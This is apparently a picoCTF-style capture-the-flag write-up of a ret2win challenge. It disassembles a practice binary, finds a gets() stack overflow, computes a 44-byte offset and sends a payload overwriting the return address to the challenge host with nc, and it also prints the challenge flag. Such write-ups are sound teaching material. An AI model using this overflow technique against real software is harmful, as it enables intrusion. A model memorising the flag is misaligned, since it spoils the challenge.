# picoCTF(2022) Ret2Win - Buffer Overflow (Binary Exploitation)

## Challenge Metadata
- **Category:** Binary Exploitation
- **Technique:** Buffer Overflow
- **Target:** `xebec.cylabacademy.net:24945`

---

## Summary
- The binary contained a vulnerable function that used `gets()` to read user input.
- The `win()` function was already present in the binary.
- By overflowing the buffer and overwriting the return address, execution was redirected to `win()`.
- The remote instance printed the flag.

---

## Initial Steps

- **Disassembling the binary:**

  ```bash
  objdump -d ./vuln
  ```

- Found the `win()` function at address:

  ```text
  080491e6 <win>
  ```

- **Finding the vulnerability:**

  Inside `vuln()`, the binary calls `gets()` to read input into a stack buffer.

  ```asm
  lea    -0x28(%ebp),%eax
  push   %eax
  call   gets@plt
  ```

  Since `gets()` does not check the input length, the buffer can be overflowed.

---

## Exploitation

- **Calculating the offset:**

  The buffer starts at `ebp - 0x28`, and the saved return address is at `ebp + 4`.

  ```text
  Offset = 0x28 + 4
         = 44 bytes
  ```

- **Converting the `win()` address to little-endian:**

  ```text
  Address:       0x080491e6
  Little-endian: e6 91 04 08
  ```

- **Final payload:**

  ```python
  b"A"*44 + b"\xe6\x91\x04\x08\n"
  ```

- **Sending the payload to the remote instance:**

  ```bash
  python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\xe6\x91\x04\x08\n")' | nc xebec.cylabacademy.net 24945
  ```

- **Successful execution:**

  The program printed:

  ```text
  Okay, time to return... Fingers Crossed... Jumping to 0x80491e6
  ```

  This confirmed that the return address was overwritten successfully and execution reached `win()`.

  The remote `win()` function opened `flag.txt` and printed its contents.

---

## Flag

**academy{addr3ss3s_ar3_3asy_30301f44}**
